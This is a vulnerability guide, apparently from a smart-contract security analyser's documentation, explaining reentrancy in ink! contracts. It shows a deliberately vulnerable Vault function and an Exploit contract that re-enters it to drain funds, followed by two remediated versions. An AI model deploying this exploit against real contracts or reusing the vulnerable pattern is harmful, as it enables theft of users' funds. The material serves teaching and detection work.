# Reentrancy
## Description
* Vulnerability Category: `Reentrancy`
* Severity: `Critical`
* Detectors: [`reentrancy-1`](https://github.com/CoinFabrik/scout/tree/main/detectors/reentrancy-1), [`reentrancy-2`](https://github.com/CoinFabrik/scout/tree/main/detectors/reentrancy-2)
* Test Cases: [`reentrancy-1`](https://github.com/CoinFabrik/scout/tree/main/test-cases/reentrancy-1/reentrancy-1), [`reentrancy-2`](https://github.com/CoinFabrik/scout/tree/main/test-cases/reentrancy-1/reentrancy-2), [`reentrancy-3`](https://github.com/CoinFabrik/scout/tree/main/test-cases/reentrancy-2/reentrancy-1)

Smart contracts can call other contracts and send tokens to them. These
operations imply external calls where control flow is passed to the called
contract until the execution of the called code is over. Then the control
is delivered back to the caller.

External calls, therefore, could open the opportunity for a malicious contract
to execute any arbitrary code. This includes calling back the caller contract,
an attack known as reentrancy. This kind of attack was used in Ethereum for
the infamous [DAO Hack](https://blog.chain.link/reentrancy-attacks-and-the-dao-hack/).

## Exploit Scenario
In order to exemplify this vulnerability we developed two contracts:
a `Vault` contract and an `Exploit` contract.

The `Vault` contract provides functions to deposit, withdraw, check balance,
and call a function on another contract with a specified value.

```rust
#[ink(message)]
pub fn call_with_value(&mut self, address: AccountId, amount: Balance, selector: u32) -> Balance {
    ink::env::debug_println!("call_with_value function called from {:?}",self.env().caller());
    let caller_addr = self.env().caller();
    let caller_balance = self.balances.get(caller_addr).unwrap_or(0);
    if amount <= caller_balance {
        let call = build_call::<ink::env::DefaultEnvironment>()
            .call(address)
            .transferred_value(amount)
            .exec_input(
                ink::env::call::ExecutionInput::new(Selector::new(selector.to_be_bytes()))
            )
            .call_flags(
                ink::env::CallFlags::default()
                    .set_allow_reentry(true)
            )
            .returns::<()>()
            .params();
        self.env().invoke_contract(&call)
            .unwrap_or_else(|err| panic!("Err {:?}",err))
            .unwrap_or_else(|err| panic!("LangErr {:?}",err));
        self.balances.insert(caller_addr, &(caller_balance - amount));

        return caller_balance - amount;
    } else {
        return caller_balance
    }
}
```

Th function `call_with_value function()` allows the contract owner to call
other contracts on the blockchain and transfer a specified amount of value in
the process. The function takes three arguments:
- *address*: The address of the contract to call.
- *amount*: The amount of balance to transfer in the call.
- *selector*: The 32-bit function selector of the function to call on the contract.

The function first checks the balance of the caller to make sure that they have
enough funds to perform the transfer. If the balance is sufficient, a new call
is constructed using the `build_call()` function provided by the
`env::call module`.

The `build_call()` function constructs a new contract call with the specified
arguments. In this case, the call method is used to specify the address of the
contract to call, the transferred_value method is used to specify the amount
of balance to transfer, and the exec_input method is used to specify the
function selector and any arguments to pass to the called function.

The `call_flags()` method is also used to set a flag that allows the called
contract to re-enter the current contract if necessary. This possibility to
re-enter the contract, together with an appropriate 32-bit function selector
will allow us to repeatedly withdraw balance from the contract, emptying the
Vault.

In order to perform this attack, we will use the `exploit()` function of the
`Exploit` contract that we outline below:

```rust
#[ink(message, payable, selector = 0x0)]
pub fn exploit(&mut self) {
    ink::env::debug_println!("Exploit  function called from {:?} gas left {:?}",self.env().caller(), self.env().gas_left());
    if self.env().gas_left() > self.gas_to_stop{
        let call = build_call::<ink::env::DefaultEnvironment>()
        .call(self.contract)
        .transferred_value(0)
        .exec_input(
            ink::env::call::ExecutionInput::new(Selector::new([0x76_u8,0x75_u8,0x7E_u8,0xD3_u8]))
                .push_arg(self.env().account_id())
                .push_arg(self.amount)
                .push_arg(0)
        )
        .call_flags(
            ink::env::CallFlags::default()
                .set_allow_reentry(true)
        )
        .returns::<Balance>()
        .params();
        ink::env::debug_println!("Call generated gas left:{:?}",self.env().gas_left());
        self.env().invoke_contract(&call)
            .unwrap_or_else(|err| panic!("Err {:?}",err))
            .unwrap_or_else(|err| panic!("LangErr {:?}",err));
        ink::env::debug_println!("Call finished");
    }
}

```

The vulnerable code example can be found [here](https://github.com/CoinFabrik/scout/tree/main/test-cases/reentrancy-1/reentrancy-1/vulnerable-example).

### Deployment
Vault and Exploit files can be found under the directories
[vulnerable-example/exploit](https://github.com/CoinFabrik/scout/tree/main/test-cases/reentrancy-1/reentrancy-1/vulnerable-example/exploit) and
[vulnerable-example/vault](https://github.com/CoinFabrik/scout/tree/main/test-cases/reentrancy-1/reentrancy-1/vulnerable-example/vault).
The whole exploit example can be run automatically using the `deploy.sh` file.

## Recommendation
In general, risks associated to reentrancy can be addressed with the
Check-Effect-Interaction pattern, a best practice that indicates that external
calls should be the last thing to be executed in a function. In this example,
this can be done by inserting the balance before transferring the value (see
[remediated-example-1](https://github.com/CoinFabrik/scout/tree/main/test-cases/reentrancy-1/reentrancy-1/remediated-example)).


```rust
pub fn call_with_value(&mut self, address: AccountId, amount: Balance, selector: u32) -> Balance {
    ink::env::debug_println!("call_with_value function called from {:?}",self.env().caller());
    let caller_addr = self.env().caller();
    let caller_balance = self.balances.get(caller_addr).unwrap_or(0);
    if amount <= caller_balance {
        self.balances.insert(caller_addr, &(caller_balance - amount));
        let call = build_call::<ink::env::DefaultEnvironment>()
            .call(address)
            .transferred_value(amount)
            .exec_input(
                ink::env::call::ExecutionInput::new(Selector::new(selector.to_be_bytes()))
            )
            .call_flags(
                ink::env::CallFlags::default()
                    .set_allow_reentry(true)
            )
            .returns::<()>()
            .params();
        self.env().invoke_contract(&call)
            .unwrap_or_else(|err| panic!("Err {:?}",err))
            .unwrap_or_else(|err| panic!("LangErr {:?}",err));

        return caller_balance - amount;
    } else {
        return caller_balance
    }
}
```

The remediated code example can be found [here](https://github.com/CoinFabrik/scout/tree/main/test-cases/reentrancy-1/reentrancy-1/remediated-example).

Alternatively, if reentrancy by an external contract is not needed, the
`set_allow_reentry(true)` should be removed altogether (see
[remediated-example-2](https://github.com/CoinFabrik/scout/tree/main/test-cases/reentrancy-1/reentrancy-2/remediated-example)). This is equivalent in Substrate to using a
[reentrancy guard](https://github.com/Supercolony-net/openbrush-contracts/tree/main/contracts/src/security/reentrancy_guard)
like the one offered by [OpenBrush](https://github.com/Supercolony-net/openbrush-contracts).

```rust
#[ink(message)]
pub fn call_with_value(&mut self, address: AccountId, amount: Balance, selector: u32) -> Balance {
    ink::env::debug_println!("call_with_value function called from {:?}",self.env().caller());
    let caller_addr = self.env().caller();
    let caller_balance = self.balances.get(caller_addr).unwrap_or(0);
    if amount <= caller_balance {
        let call = build_call::<ink::env::DefaultEnvironment>()
            .call(address)
            .transferred_value(amount)
            .exec_input(
                ink::env::call::ExecutionInput::new(Selector::new(selector.to_be_bytes()))
            )
            .returns::<()>()
            .params();
        self.env().invoke_contract(&call)
            .unwrap_or_else(|err| panic!("Err {:?}",err))
            .unwrap_or_else(|err| panic!("LangErr {:?}",err));
        self.balances.insert(caller_addr, &(caller_balance - amount));

        return caller_balance - amount;
    } else {
        return caller_balance
    }
}
```

The remediated code example can be found [here](https://github.com/CoinFabrik/scout/tree/main/test-cases/reentrancy-1/reentrancy-2/remediated-example).

## References
* https://use.ink/datastructures/storage-layout
* https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/
* https://dasp.co/#item-1
* https://blog.sigmaprime.io/solidity-security.html#SP-1
* https://docs.soliditylang.org/en/develop/security-considerations.html#re-entrancy
* [Ethernaut: Reentrancy](https://stermi.medium.com/the-ethernaut-challenge-9-solution-re-entrancy-635303881a4f)
* [SWC-107](https://swcregistry.io/docs/SWC-107)
* [Slither: Reentrancy vulnerabilities (theft of ethers)](https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities)
* [Slither: Reentrancy vulnerabilities (no theft of ethers)](https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-1)
* [Slither: Benign reentrancy vulnerabilities](https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-2)
* [Slither: Reentrancy vulnerabilities leading to out-of-order Events](https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-3)
* [Slither: Reentrancy vulnerabilities through send and transfer](https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-4)
